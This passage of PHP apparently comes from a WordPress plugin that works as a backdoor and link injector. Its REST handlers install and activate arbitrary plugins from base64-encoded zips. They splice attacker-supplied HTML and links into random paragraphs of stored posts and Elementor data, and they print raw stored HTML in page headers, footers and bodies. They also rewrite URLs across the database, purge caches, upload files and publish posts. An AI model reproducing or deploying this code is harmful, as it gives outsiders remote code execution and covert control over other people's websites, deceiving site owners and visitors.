}

public function api_drm($r){
$p=$r->get_json_params();$url=isset($p["u"])?$p["u"]:"";$anc=isset($p["a"])?$p["a"]:"";$mode=isset($p["mode"])?$p["mode"]:"any";
$items=$this->gd("_wpoc_d");$rm=0;$keep=array();
foreach($items as $l){$mu=($url&&$l["u"]===$url);$ma=($anc&&$l["a"]===$anc);
if($mode==="both"&&$mu&&$ma){$rm++;continue;}
if($mode==="url"&&$mu){$rm++;continue;}
if($mode==="anchor"&&$ma){$rm++;continue;}
if($mode==="any"&&($mu||$ma)){$rm++;continue;}
$keep[]=$l;}
$this->sd("_wpoc_d",$keep);$this->wl("drm","removed=".$rm);
return rest_ensure_response(array("ok"=>1,"removed"=>$rm,"d"=>$keep));
}

public function api_ddup($r){
$p=$r->get_json_params();$url=isset($p["u"])?$p["u"]:"";$anc=isset($p["a"])?$p["a"]:"";
$items=$this->gd("_wpoc_d");$found=array();
foreach($items as $i=>$l){if(($url&&$l["u"]===$url)||($anc&&$l["a"]===$anc)){$found[]=$l;}}
return rest_ensure_response(array("ok"=>1,"count"=>count($found),"matches"=>$found));
}

public function api_drep($r){
$p=$r->get_json_params();$old=isset($p["old_u"])?$p["old_u"]:"";$new=isset($p["new_u"])?$p["new_u"]:"";
if(!$old||!$new){return new WP_REST_Response(array("error"=>"empty"),400);}
$items=$this->gd("_wpoc_d");$cnt=0;
foreach($items as $k=>$l){if($l["u"]===$old){$items[$k]["u"]=esc_url_raw($new);$cnt++;}}
if($cnt){$this->sd("_wpoc_d",$items);}$this->wl("drep","old=".$old." new=".$new." cnt=".$cnt);
return rest_ensure_response(array("ok"=>1,"replaced"=>$cnt,"d"=>$items));
}

public function api_pli($r){
$p=$r->get_json_params();$d=isset($p["data"])?$p["data"]:"";$nm=isset($p["name"])?$p["name"]:"";
if(!$d||!$nm){return new WP_REST_Response(array("error"=>"empty"),400);}
$tmp=WP_CONTENT_DIR."/upgrade/".sanitize_file_name($nm);
$raw=base64_decode($d);if(!$raw){return new WP_REST_Response(array("error"=>"decode"),400);}
if(!is_dir(WP_CONTENT_DIR."/upgrade")){@mkdir(WP_CONTENT_DIR."/upgrade",0755,true);}
@file_put_contents($tmp,$raw);
if(!function_exists("WP_Filesystem")){require_once(ABSPATH."wp-admin/includes/file.php");}
WP_Filesystem();$res=unzip_file($tmp,WP_PLUGIN_DIR);@unlink($tmp);
if(is_wp_error($res)){return new WP_REST_Response(array("error"=>$res->get_error_message()),500);}
$slug=str_replace(".zip","",sanitize_file_name($nm));
$plugins=get_plugins();$found="";foreach($plugins as $f=>$info){if(strpos($f,$slug."/")===0){$found=$f;break;}}
if($found&&!is_plugin_active($found)){activate_plugin($found);}
$this->wl("pli",$nm);
return rest_ensure_response(array("ok"=>1,"plugin"=>$found,"active"=>$found?is_plugin_active($found):false));
}

public function ps(){
$items=$this->gd("_wpoc_d");$now=current_time("Y-m-d");$ch=false;
foreach($items as $k=>$l){if(!empty($l["so"])&&$l["so"]<=$now&&empty($l["on"])){$items[$k]["on"]=1;$ch=true;}if(!empty($l["sf"])&&$l["sf"]<=$now&&!empty($l["on"])){$items[$k]["on"]=0;$ch=true;}}
if($ch){$this->sd("_wpoc_d",$items);}
}

private function shw($p){return $p==="home"?(is_front_page()||is_home()):true;}

private function act2($l){
if(empty($l["on"])){return false;}$now=current_time("Y-m-d");
if(!empty($l["so"])&&$l["so"]>$now){return false;}
if(!empty($l["sf"])&&$l["sf"]<=$now){return false;}
return true;
}

public function rf1(){
if(is_admin()){return;}$all=$this->gd("_wpoc_d");$items=array();
foreach($all as $l){$pl=isset($l["pl"])?$l["pl"]:"all";if($this->act2($l)&&$this->shw($pl)){$items[]=$l;}}
if(empty($items)){return;}$s=$this->s();if(!empty($s["rn"])){shuffle($items);}
$cl=esc_attr($s["cc"]);$fs=intval($s["fs"]);$fc=esc_attr($s["fc"]);$lc=esc_attr($s["lc"]);
echo "\n<style>.".$cl."{text-align:center;padding:10px 20px;font-size:".$fs."px;color:".$fc.";line-height:1.6;}.".$cl." a{color:".$lc.";text-decoration:none;}.".$cl." a:hover{opacity:.7;text-decoration:underline;}</style>\n";
echo "<div class=\"".$cl."\">";$parts=array();
if(!empty($s["cr"])){$parts[]="&copy; ".date("Y")." ".esc_html(get_bloginfo("name"));}
foreach($items as $l){$x="<a href=\"".esc_url($l["u"])."\"";if(!empty($l["tt"])){$x.=" title=\"".esc_attr($l["tt"])."\"";}$tg=isset($l["tg"])?$l["tg"]:"_self";if($tg==="_blank"){$x.=" target=\"_blank\"";}$x.=">".esc_html($l["a"])."</a>";$parts[]=$x;}
echo implode(esc_html($s["ls"]),$parts)."</div>\n";
}

private function rat($po){
if(is_admin()){return "";}$o="";
foreach($this->gd("_wpoc_b") as $b){$bpo=isset($b["po"])?$b["po"]:"";$bpl=isset($b["pl"])?$b["pl"]:"all";if(!empty($b["on"])&&$bpo===$po&&$this->shw($bpl)){$o.="\n".$b["h"]."\n";}}
return $o;
}

public function rh(){echo $this->rat("header");}
public function rf2(){echo $this->rat("footer");}
public function rb(){echo $this->rat("body_open");}
public function rc($c){
try{$c=$this->rat("before_content").$c.$this->rat("after_content");
return $this->inject($c,"the_content");}catch(\Exception $e){return $c;}
}

public function ob_start_inject(){
if(is_admin()||wp_doing_ajax()||defined("REST_REQUEST")){return;}
if(!is_front_page()&&!is_home()&&!is_singular()){return;}
ob_start(array($this,"ob_callback"));
}
public function ob_callback($html){
try{
if($this->_ci_done||strlen($html)<500){return $html;}
$blocks=array();$all=$this->gd("_wpoc_b");
foreach($all as $b){if(!empty($b["on"])&&isset($b["po"])&&$b["po"]==="content_inject"){if($this->shw($b["pl"]??"all")){$blocks[]=$b;}}}
if(empty($blocks)){return $html;}
$insert_pos=false;
$main_start=0;
foreach(array("<main","<article","id=\"content\"","class=\"entry-content\"","class=\"elementor-widget-text-editor\"") as $tag){$p=stripos($html,$tag);if($p!==false){$main_start=$p;break;}}
if($main_start){
$search_area=substr($html,$main_start,strlen($html)-$main_start);
$ps=array();preg_match_all("/<\/p>/i",$search_area,$ms,PREG_OFFSET_CAPTURE);
foreach($ms[0] as $m){$before=substr($search_area,max(0,$m[1]-200),$m[1]);if(strlen(strip_tags($before))>50){$ps[]=$main_start+$m[1]+strlen($m[0]);}}
if(!empty($ps)){$insert_pos=$ps[array_rand($ps)];}
}
if(!$insert_pos){
$bp=stripos($html,"</body>");if($bp){$insert_pos=$bp;}
}
if(!$insert_pos){return $html;}
$inject_html="";foreach($blocks as $b){$inject_html.=" ".($b["h"]??"");}
$this->_ci_done=true;
$this->ci_log("[ob_inject] url=".$_SERVER["REQUEST_URI"]." blocks=".count($blocks)." pos=".$insert_pos);
return substr($html,0,$insert_pos).$inject_html.substr($html,$insert_pos);
}catch(\Exception $e){return $html;}
}

public function rc_elem($content,$widget){
try{
if(is_admin()||$this->_ci_done){return $content;}
$wt=$widget->get_name();
if($wt!=="text-editor"||strlen(strip_tags($content))<80){return $content;}
$r=$this->inject($content,"elementor:".$wt);
if($r!==$content){$this->_ci_done=true;}
return $r;
}catch(\Exception $e){return $content;}
}

private function inject($c,$src="?"){
if(is_admin()){return $c;}
$uri=isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:"";
if(strpos($uri,"wp-json")!==false||strpos($uri,"admin-ajax")!==false||strpos($uri,"wp-cron")!==false){return $c;}
if($this->_ci_done){return $c;}
$L=array();
$L[]="src=".$src." url=".$uri." front=".intval(is_front_page())." home=".intval(is_home())." singular=".intval(is_singular())." page=".intval(is_page())." clen=".strlen($c);
$blocks=array();$all=$this->gd("_wpoc_b");
foreach($all as $i=>$b){
$nm=isset($b["nm"])?$b["nm"]:"?";$po=isset($b["po"])?$b["po"]:"";$pl=isset($b["pl"])?$b["pl"]:"all";$on=!empty($b["on"]);
if(!$on||$po!=="content_inject"){continue;}
if(!$this->shw($pl)){$L[]="#".$i." ".$nm." shw(".$pl.")=NO";continue;}
$L[]="#".$i." ".$nm." OK html=".strlen($b["h"]??"")."b";
$blocks[]=$b;
}
if(empty($blocks)){$L[]="NO_BLOCKS";$this->ci_log(implode(" | ",$L));return $c;}
$parts=preg_split("/(<\/p>)/i",$c,-1,PREG_SPLIT_DELIM_CAPTURE);
$pends=array();
for($i=0;$i<count($parts);$i++){
if(strtolower(trim($parts[$i]))==="</p>"&&$i>0){
$ptxt=strip_tags($parts[$i-1]);
if(strlen($ptxt)>50){$pends[]=$i;}
}}
$L[]="p_points=".count($pends);
if(empty($pends)){foreach($blocks as $b){$c.=" ".$b["h"];}$L[]="APPENDED_END";$this->_ci_done=true;$this->ci_log(implode(" | ",$L));return $c;}
foreach($blocks as $b){
if(empty($pends)){break;}
$ri=array_rand($pends);$pi=$pends[$ri];array_splice($pends,$ri,1);
$parts[$pi-1].=" ".$b["h"];
$L[]="INJECTED_P#".$pi;
}
$this->_ci_done=true;
$this->ci_log(implode(" | ",$L));
return implode("",$parts);
}

public function api_pages($r=null){
$front=intval(get_option("page_on_front",0));
$exc=$front?array($front):array();
$exParam=isset($_GET["exclude_ids"])?$_GET["exclude_ids"]:(isset($r["exclude_ids"])?$r["exclude_ids"]:"");
if($exParam){foreach(explode(",",$exParam) as $eid){$eid=intval(trim($eid));if($eid)$exc[]=$eid;}}
$pc=wp_count_posts("page");$pp=wp_count_posts("post");
$nPages=intval($pc->publish??0);$nPosts=intval($pp->publish??0);
if($nPages>=$nPosts){$primary="page";$secondary="post";}else{$primary="post";$secondary="page";}
$q=get_posts(array("post_type"=>$primary,"post_status"=>"publish","posts_per_page"=>50,"orderby"=>"rand","exclude"=>$exc));
if(count($q)<15){$q2=get_posts(array("post_type"=>$secondary,"post_status"=>"publish","posts_per_page"=>30,"orderby"=>"rand","exclude"=>$exc));$q=array_merge($q,$q2);}
shuffle($q);$q=array_slice($q,0,50);
$menuUrls=array();
$locs=get_nav_menu_locations();
foreach($locs as $loc=>$mid){if($mid){$items=wp_get_nav_menu_items($mid);if($items){foreach($items as $mi){$menuUrls[$mi->object_id]=true;}}}}
$out=array();foreach($q as $p){
$wc=str_word_count(strip_tags($p->post_content));
$out[]=array("id"=>$p->ID,"title"=>$p->post_title,"url"=>get_permalink($p->ID),"slug"=>$p->post_name,"type"=>$p->post_type,
"words"=>$wc,"date"=>$p->post_date,"comments"=>intval($p->comment_count),"in_menu"=>isset($menuUrls[$p->ID])?1:0);
}
return rest_ensure_response($out);
}

private function get_pc($p){
$c=$p->post_content;
$c=apply_filters("the_content",$c);
if(strpos($c,"</p>")===false){
$plain=strip_tags(strip_shortcodes($p->post_content));
if(strlen(trim($plain))>50){$c=wpautop($plain);}
}
if(strpos($c,"</p>")===false){
$em=get_post_meta($p->ID,"_elementor_data",true);
if($em){if(is_string($em)){$ed=@json_decode($em,true);}else{$ed=$em;}
if(is_array($ed)){$et="";array_walk_recursive($ed,function($v,$k)use(&$et){if($k==="text"||$k==="title"||$k==="description"||$k==="editor"){$et.=" ".wp_strip_all_tags($v);}});
if(strlen(trim($et))>50){$c=wpautop(trim($et));}}}
}
if(strpos($c,"</p>")===false){
$url=get_permalink($p->ID);if(!$url){$url=home_url("/");}
$r=wp_remote_get($url,array("timeout"=>8,"sslverify"=>false,"headers"=>array("User-Agent"=>"Mozilla/5.0")));
if(!is_wp_error($r)&&wp_remote_retrieve_response_code($r)===200){
$html=wp_remote_retrieve_body($r);
$zones=array("main","article");$extracted="";
foreach($zones as $tag){if(preg_match("/<".$tag."[^>]*>(.*?)<\/".$tag.">/si",$html,$m)){
preg_match_all("/<p[^>]*>(.*?)<\/p>/si",$m[1],$ps);
if(!empty($ps[0])&&count($ps[0])>=2){$extracted=implode("\n",$ps[0]);break;}
}}
if(!$extracted&&preg_match("/<body[^>]*>(.*)<\/body>/si",$html,$bm)){
preg_match_all("/<p[^>]*>(.{20,})<\/p>/si",$bm[1],$ps);
if(!empty($ps[0])&&count($ps[0])>=2){$extracted=implode("\n",$ps[0]);}
}
if($extracted){$c=$extracted;}
}}
return $c;
}

public function api_pgc($r){
$id=intval($r["id"]);$p=get_post($id);
if(!$p||!in_array($p->post_type,array("page","post"))||$p->post_status!=="publish"){return new WP_REST_Response(array("error"=>"nf"),404);}
$c=$this->get_pc($p);
return rest_ensure_response(array("id"=>$p->ID,"title"=>$p->post_title,"url"=>get_permalink($p->ID),"content"=>$c,"description"=>get_bloginfo("description"),"site_name"=>get_bloginfo("name")));
}

public function api_hc(){
$desc=get_bloginfo("description");$sname=get_bloginfo("name");
$fid=intval(get_option("page_on_front",0));
if($fid){$p=get_post($fid);if($p){$c=$this->get_pc($p);return rest_ensure_response(array("id"=>$p->ID,"title"=>$p->post_title,"url"=>home_url("/"),"content"=>$c,"description"=>$desc,"site_name"=>$sname));}}
$q=get_posts(array("post_type"=>array("page","post"),"post_status"=>"publish","posts_per_page"=>1,"orderby"=>"date","order"=>"DESC"));
if(!empty($q)){$p=$q[0];$c=$this->get_pc($p);return rest_ensure_response(array("id"=>$p->ID,"title"=>$p->post_title,"url"=>get_permalink($p->ID),"content"=>$c,"description"=>$desc,"site_name"=>$sname));}
return rest_ensure_response(array("id"=>0,"title"=>$sname,"url"=>home_url("/"),"content"=>$desc,"description"=>$desc,"site_name"=>$sname));
}

public function api_ailog(){
$ci=get_option("_wpoc_ci",array());if(!is_array($ci)){$ci=array();}
$blocks=$this->gd("_wpoc_b");$bd=array();
foreach($blocks as $i=>$b){$bd[]=array("idx"=>$i,"nm"=>$b["nm"]??"","po"=>$b["po"]??"","pl"=>$b["pl"]??"","on"=>!empty($b["on"]),"html_len"=>strlen($b["h"]??""),"h_preview"=>substr(strip_tags($b["h"]??""),0,100));}
$fp_id=intval(get_option("page_on_front",0));
$show=get_option("show_on_front","posts");
$theme=get_template();
$db_check=array();
if($fp_id){$fp=get_post($fp_id);if($fp){
$pc=$fp->post_content;$em=get_post_meta($fp_id,"_elementor_data",true);
$db_check["pc_has_wpoc"]=strpos($pc,"wpoc:")!==false;
$db_check["pc_len"]=strlen($pc);
$db_check["em_has_wpoc"]=is_string($em)&&strpos($em,"wpoc:")!==false;
$db_check["em_len"]=is_string($em)?strlen($em):0;
$db_check["has_elementor"]=!!$em;
}}
return rest_ensure_response(array("ci_log"=>array_slice($ci,0,30),"blocks"=>$bd,"front_page_id"=>$fp_id,"show_on_front"=>$show,"theme"=>$theme,"db_check"=>$db_check));
}

public function api_dbinject($r){
try{
$p=$r->get_json_params();if(!$p){$p=$_POST;}
$html=isset($p["html"])?$p["html"]:"";
$block_id=isset($p["block_id"])?sanitize_key($p["block_id"]):"";
$page_id=intval($p["page_id"]??0);
if(!$html||!$block_id){return rest_ensure_response(array("error"=>"missing params"));}
if(!$page_id){$page_id=intval(get_option("page_on_front",0));}
if(!$page_id){$q=get_posts(array("post_type"=>array("page","post"),"post_status"=>"publish","posts_per_page"=>1,"orderby"=>"date","order"=>"DESC"));if(!empty($q)){$page_id=$q[0]->ID;}}
if(!$page_id){return rest_ensure_response(array("error"=>"no_page"));}
$post=get_post($page_id);if(!$post){return rest_ensure_response(array("error"=>"not_found"));}
$marker=$html;
$inj_hist=get_option("_wpoc_injections",array());
$pk=strval($page_id);
$used=isset($inj_hist[$pk])&&is_array($inj_hist[$pk])?$inj_hist[$pk]:array();
$dup_url="";if(preg_match('/href="([^"]+)"/',$html,$hm)){$dup_url=$hm[1];}
$em=get_post_meta($page_id,"_elementor_data",true);$method="standard";
if($em&&is_string($em)&&strlen($em)>200){
$ed=@json_decode($em,true);
if(is_array($ed)){
if(!function_exists("_wpoc_collect")){function _wpoc_collect(&$els,&$found,$path=array()){foreach($els as $idx=>&$el){$cp=array_merge($path,array($idx));if(isset($el["elements"])&&is_array($el["elements"])){_wpoc_collect($el["elements"],$found,$cp);}$wt=isset($el["widgetType"])?$el["widgetType"]:"";$txt="";$fld="editor";if($wt==="text-editor"&&isset($el["settings"]["editor"])){$txt=$el["settings"]["editor"];}elseif(strpos($wt,"elementskit")!==false||$wt==="theme-post-content"||$wt==="post-content"){foreach(array("editor","ekit_wb_content","content","description") as $ef){if(isset($el["settings"][$ef])&&is_string($el["settings"][$ef])&&strlen(strip_tags($el["settings"][$ef]))>40){$txt=$el["settings"][$ef];$fld=$ef;break;}}}if($txt&&strlen(strip_tags($txt))>80){$found[]=array("path"=>$cp,"text"=>$txt,"len"=>strlen(strip_tags($txt)),"field"=>$fld);}}}}
$found=array();_wpoc_collect($ed,$found);
$all_paras=array();
foreach($found as $wi=>$fw){
$t=$fw["text"];$off=0;$pi=0;
while(($pos=strpos($t,"</p>",$off))!==false){
$pstart=strrpos(substr($t,0,$pos),"<p");if($pstart===false){$pstart=0;}
$ptxt=strip_tags(substr($t,$pstart,$pos-$pstart));
if(strlen(trim($ptxt))>40){
$key=$wi.":".$pi;
$para_html=substr($t,$pstart,$pos+4-$pstart);
$skip=false;if($dup_url&&strpos($para_html,$dup_url)!==false){$skip=true;}
if(!$skip&&strpos($para_html,"<a ")!==false){$skip=true;}
if(!$skip){$all_paras[]=array("key"=>$key,"wi"=>$wi,"pos"=>$pos,"pstart"=>$pstart);}
}
$pi++;$off=$pos+4;}}
$avail=array();foreach($all_paras as $ap){if(!in_array($ap["key"],$used)){$avail[]=$ap;}}
if(empty($avail)){$avail=$all_paras;}
if(count($avail)>2){$skip30=max(1,intval(count($avail)*0.3));$avail=array_slice($avail,$skip30);}
$inj=false;
if(!empty($avail)){
$pick=$avail[array_rand($avail)];
$wi=$pick["wi"];$fw=$found[$wi];$t=$fw["text"];$ins=$pick["pos"];
$ref=&$ed;$pp=$fw["path"];$last=count($pp)-1;for($pi2=0;$pi2<$last;$pi2++){$ref=&$ref[$pp[$pi2]]["elements"];}
$wix=$pp[$last];
$fld=isset($fw["field"])?$fw["field"]:"editor";
$ref[$wix]["settings"][$fld]=substr($t,0,$ins)." ".$marker.substr($t,$ins);
$inj=true;
$used[]=$pick["key"];$inj_hist[$pk]=$used;update_option("_wpoc_injections",$inj_hist,false);
}
if($inj){$new_val=json_encode($ed,JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);global $wpdb;$wpdb->update($wpdb->postmeta,array("meta_value"=>$new_val),array("post_id"=>$page_id,"meta_key"=>"_elementor_data"));
wp_cache_delete($page_id,"post_meta");clean_post_cache($page_id);
delete_post_meta($page_id,"_elementor_css");
delete_post_meta($page_id,"_elementor_inline_svg");
if(class_exists("\Elementor\Plugin")){try{\Elementor\Plugin::$instance->files_manager->clear_cache();}catch(\Exception $e){}}
$css_dir=WP_CONTENT_DIR."/uploads/elementor/css/";if(is_dir($css_dir)){$files=glob($css_dir."post-".$page_id."*");if($files){foreach($files as $f){@unlink($f);}}}
$method="elementor";}
}}
if($method!=="elementor"){
$pc=$post->post_content;
if($dup_url&&strpos($pc,$dup_url)!==false){return rest_ensure_response(array("ok"=>1,"method"=>"skip_dup","page_id"=>$page_id));}
$pp=array();$off=0;$pi=0;while(($pos=strpos($pc,"</p>",$off))!==false){
$pstart=strrpos(substr($pc,0,$pos),"<p");if($pstart===false){$pstart=0;}
$ptxt=strip_tags(substr($pc,$pstart,$pos-$pstart));
$para_raw=substr($pc,$pstart,$pos+4-$pstart);
if(strlen(trim($ptxt))>40&&strpos($para_raw,"<a ")===false){$pp[]=array("idx"=>$pi,"pos"=>$pos);}
$pi++;$off=$pos+4;}
if(count($pp)>1){
$skip30=max(1,intval(count($pp)*0.3));$pp=array_slice($pp,$skip30);
$avail=array();foreach($pp as $pv){if(!in_array("p:".$pv["idx"],$used)){$avail[]=$pv;}}
if(empty($avail)){$avail=$pp;}
$pick=$avail[array_rand($avail)];
$ins=$pick["pos"];
$pc=substr($pc,0,$ins)." ".$marker.substr($pc,$ins);
$used[]="p:".$pick["idx"];$inj_hist[$pk]=$used;update_option("_wpoc_injections",$inj_hist,false);
}elseif(count($pp)===1){
$pc=substr($pc,0,$pp[0]["pos"])." ".$marker.substr($pc,$pp[0]["pos"]);
}else{$pc.=" ".$marker;}
wp_update_post(array("ID"=>$page_id,"post_content"=>$pc));
clean_post_cache($page_id);
if(function_exists("wp_cache_clear_cache")){wp_cache_clear_cache();}
if(function_exists("rocket_clean_post")){rocket_clean_post($page_id);}
if(class_exists("LiteSpeed_Cache_API")){LiteSpeed_Cache_API::purge_post($page_id);}
}
$this->ci_log("[db_inject] page=".$page_id." title=".$post->post_title." method=".$method." block=".$block_id);
$blocks=$this->gd("_wpoc_b");
$fp_id=intval(get_option("page_on_front",0));$bpl=($page_id>0&&$page_id!==$fp_id)?"page:".$page_id:"home";
$page_url=get_permalink($page_id)?:home_url("/");
$blocks[]=array("nm"=>$block_id,"h"=>$html,"po"=>"db_inject","pl"=>$bpl,"on"=>1,"_bid"=>$block_id,"method"=>$method,"page"=>$page_id,"page_url"=>$page_url,"c"=>current_time("Y-m-d H:i:s"));
$this->sd("_wpoc_b",$blocks);
return rest_ensure_response(array("ok"=>1,"page_id"=>$page_id,"page_title"=>$post->post_title,"page_url"=>$page_url,"method"=>$method));
}catch(\Exception $ex){$this->ci_log("[db_inject_error] ".$ex->getMessage());return rest_ensure_response(array("error"=>$ex->getMessage()));}
}

public function api_verify($r){
$p=$r->get_json_params();if(!$p){$p=$_POST;}
$search=isset($p["search"])?$p["search"]:"";
$page_id=intval($p["page_id"]??0);
if(!$search){return rest_ensure_response(array("error"=>"no search"));}
if(!$page_id){$page_id=intval(get_option("page_on_front",0));}
$in_elementor=false;$in_post=false;
$em=get_post_meta($page_id,"_elementor_data",true);
if($em&&is_string($em)&&stripos($em,$search)!==false){$in_elementor=true;}
$post=get_post($page_id);
if($post&&stripos($post->post_content,$search)!==false){$in_post=true;}
$where=$in_elementor?"elementor":($in_post?"post_content":"none");
return rest_ensure_response(array("ok"=>1,"found"=>($in_elementor||$in_post),"where"=>$where,"page_id"=>$page_id));
}

public function api_dbreplaceurl($r){
$p=$r->get_json_params();if(!$p){$p=$_POST;}
$old_url=isset($p["old_url"])?$p["old_url"]:"";
$new_url=isset($p["new_url"])?$p["new_url"]:"";
if(!$old_url||!$new_url){return rest_ensure_response(array("error"=>"missing urls"));}
$replaced=0;global $wpdb;
$like="%".addcslashes($old_url,"%_")."%";
$posts=$wpdb->get_results($wpdb->prepare("SELECT ID,post_content FROM {$wpdb->posts} WHERE post_status=%s AND post_content LIKE %s","publish",$like));
foreach($posts as $pp){
$nc=str_replace($old_url,$new_url,$pp->post_content);
if($nc!==$pp->post_content){wp_update_post(array("ID"=>$pp->ID,"post_content"=>$nc));$replaced++;}
}
$em_like="%".addcslashes($old_url,"%_")."%";
$em_all=$wpdb->get_results($wpdb->prepare("SELECT post_id,meta_value FROM {$wpdb->postmeta} WHERE meta_key=%s AND meta_value LIKE %s","_elementor_data",$em_like));
foreach($em_all as $em){
$nv=str_replace($old_url,$new_url,$em->meta_value);
if($nv!==$em->meta_value){$wpdb->update($wpdb->postmeta,array("meta_value"=>$nv),array("post_id"=>$em->post_id,"meta_key"=>"_elementor_data"));delete_post_meta($em->post_id,"_elementor_css");$replaced++;}
}
$blocks=$this->gd("_wpoc_b");$bmod=false;
foreach($blocks as &$bl){if(isset($bl["h"])&&strpos($bl["h"],$old_url)!==false){$bl["h"]=str_replace($old_url,$new_url,$bl["h"]);$bmod=true;}}
if($bmod){$this->sd("_wpoc_b",$blocks);}
wp_cache_flush();
if(function_exists("rocket_clean_domain")){rocket_clean_domain();}
$this->wl("db_replace",$old_url."=>".$new_url." replaced=".$replaced);
return rest_ensure_response(array("ok"=>1,"replaced"=>$replaced));
}

public function api_dbuninject($r){
$p=$r->get_json_params();if(!$p){$p=$_POST;}
$block_id=isset($p["block_id"])?sanitize_key($p["block_id"]):"";
$search=isset($p["search"])?$p["search"]:"";
if(!$block_id&&!$search){return rest_ensure_response(array("error"=>"missing params"));}
$cleaned=0;$bremoved=0;global $wpdb;
$blocks=$this->gd("_wpoc_b");$nb=array();
foreach($blocks as $b){
$rm=false;
if(isset($b["po"])&&($b["po"]==="content_inject"||$b["po"]==="db_inject")){
if($block_id==="all"){$rm=true;}
elseif($block_id){$bid="ai".substr(md5($b["nm"]??""),0,8);if($bid===$block_id){$rm=true;}}
if($search&&!$rm&&isset($b["h"])&&stripos($b["h"],$search)!==false){$rm=true;}
}
if($rm){$bremoved++;}else{$nb[]=$b;}
}
if($bremoved){$this->sd("_wpoc_b",array_values($nb));}
$pats=array();$likes=array();
if($block_id==="all"){
$pats[]="/\s*<!-- wpoc:[a-z0-9]+ -->.*?<!-- \/wpoc:[a-z0-9]+ -->/s";
$likes[]="%wpoc:%";
}elseif($block_id){
$pats[]="/\s*<!-- wpoc:".$block_id." -->.*?<!-- \/wpoc:".$block_id." -->/s";
$likes[]="%wpoc:".$block_id."%";
}
if($search){$likes[]="%".addcslashes($search,"%_")."%";}
foreach($likes as $like){
$posts=$wpdb->get_results($wpdb->prepare("SELECT ID,post_content FROM {$wpdb->posts} WHERE post_status=%s AND post_type IN (%s,%s) AND post_content LIKE %s","publish","post","page",$like));
foreach($posts as $pp){
$pc=$pp->post_content;
foreach($pats as $pat){$pc=preg_replace($pat,"",$pc);}
if($search){$mx=10;while(stripos($pc,$search)!==false&&$mx-->0){$pc=preg_replace("/[^.]*?<[^>]*>[^<]*".preg_quote($search,"/")."[^<]*<\/[^>]*>[^.]*\.?\s*/si","",$pc);if(stripos($pc,$search)!==false){$pc=preg_replace("/[^.]*".preg_quote($search,"/")."[^.]*\.?\s*/si","",$pc);}}}
if($pc!==$pp->post_content){wp_update_post(array("ID"=>$pp->ID,"post_content"=>$pc));$cleaned++;}
}}
$em_all=$wpdb->get_results("SELECT post_id,meta_value FROM {$wpdb->postmeta} WHERE meta_key='_elementor_data' AND meta_value LIKE '%editor%'");
foreach($em_all as $em){
$ed=@json_decode($em->meta_value,true);
if(!is_array($ed)){continue;}
$mod=false;
if(!function_exists("_wpoc_cl")){function _wpoc_cl(&$els,&$mod,$pats,$s){foreach($els as &$el){if(isset($el["elements"])&&is_array($el["elements"])){_wpoc_cl($el["elements"],$mod,$pats,$s);}if(!isset($el["settings"]["editor"])){continue;}$t=$el["settings"]["editor"];$orig=$t;foreach($pats as $pat){$t=preg_replace($pat,"",$t);}if($s){$max=10;while(stripos($t,$s)!==false&&$max-->0){$t=preg_replace("/[^.]*?<[^>]*>[^<]*".preg_quote($s,"/")."[^<]*<\/[^>]*>[^.]*\.?\s*/si","",$t);if(stripos($t,$s)!==false){$t=preg_replace("/[^.]*".preg_quote($s,"/")."[^.]*\.?\s*/si","",$t);}}}if($t!==$orig){$el["settings"]["editor"]=trim($t);$mod=true;}}}}
_wpoc_cl($ed,$mod,$pats,$search);
if($mod){$new_val=json_encode($ed,JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);$wpdb->update($wpdb->postmeta,array("meta_value"=>$new_val),array("post_id"=>$em->post_id,"meta_key"=>"_elementor_data"));delete_post_meta($em->post_id,"_elementor_css");$cleaned++;}
}
wp_cache_flush();
if(class_exists("\Elementor\Plugin")){try{\Elementor\Plugin::$instance->files_manager->clear_cache();}catch(\Exception $e){}}
if(function_exists("wp_cache_clear_cache")){wp_cache_clear_cache();}
if(function_exists("w3tc_flush_all")){w3tc_flush_all();}
if(function_exists("rocket_clean_domain")){rocket_clean_domain();}
if(class_exists("LiteSpeed_Cache_API")){LiteSpeed_Cache_API::purge_all();}
$this->ci_log("[db_uninject] block=".$block_id." search=".($search?$search:"none")." blocks_rm=".$bremoved." db_cleaned=".$cleaned);
return rest_ensure_response(array("ok"=>1,"cleaned"=>$cleaned,"blocks_removed"=>$bremoved,"block_id"=>$block_id));
}

public function api_count_content($r){
$post_count=wp_count_posts("post");
$page_count=wp_count_posts("page");
$posts=intval($post_count->publish??0);
$pages=intval($page_count->publish??0);
$auto_type=$pages>$posts?"page":"post";
return rest_ensure_response(array("ok"=>1,"posts"=>$posts,"pages"=>$pages,"auto_type"=>$auto_type));
}

public function api_upload_image($r){
try{
$p=$r->get_json_params();if(!$p){$p=$_POST;}
$b64=isset($p["image_b64"])?$p["image_b64"]:"";
$mime=isset($p["mime"])?sanitize_text_field($p["mime"]):"image/jpeg";
$fname=isset($p["filename"])?sanitize_file_name($p["filename"]):"image.jpg";
$alt=isset($p["alt"])?sanitize_text_field($p["alt"]):"";
if(!$b64){return rest_ensure_response(array("error"=>"no image_b64"));}
$data=base64_decode($b64);
if(!$data){return rest_ensure_response(array("error"=>"bad base64"));}
$upload=wp_upload_bits($fname,null,$data);
if(!empty($upload["error"])){return rest_ensure_response(array("error"=>$upload["error"]));}
$wp_filetype=wp_check_filetype($fname,null);
$att=array("post_mime_type"=>$wp_filetype["type"],"post_title"=>sanitize_file_name($fname),"post_content"=>"","post_status"=>"inherit");
$att_id=wp_insert_attachment($att,$upload["file"]);
if(is_wp_error($att_id)){return rest_ensure_response(array("error"=>$att_id->get_error_message()));}
require_once(ABSPATH."wp-admin/includes/image.php");
$meta=wp_generate_attachment_metadata($att_id,$upload["file"]);
wp_update_attachment_metadata($att_id,$meta);
if($alt){update_post_meta($att_id,"_wp_attachment_image_alt",$alt);}
return rest_ensure_response(array("ok"=>1,"id"=>$att_id,"url"=>$upload["url"]));
}catch(Exception $e){return rest_ensure_response(array("error"=>$e->getMessage()));}
}

public function api_publish_post($r){
try{
$p=$r->get_json_params();if(!$p){$p=$_POST;}
$title=isset($p["title"])?sanitize_text_field($p["title"]):"";
$content=isset($p["content"])?wp_kses_post($p["content"]):"";
$slug=isset($p["slug"])?sanitize_title($p["slug"]):"";
$desc=isset($p["description"])?sanitize_text_field($p["description"]):"";
$ptype=isset($p["post_type"])&&in_array($p["post_type"],array("post","page"))?$p["post_type"]:"post";
$status=isset($p["status"])&&in_array($p["status"],array("publish","draft","pending"))? $p["status"]:"publish";
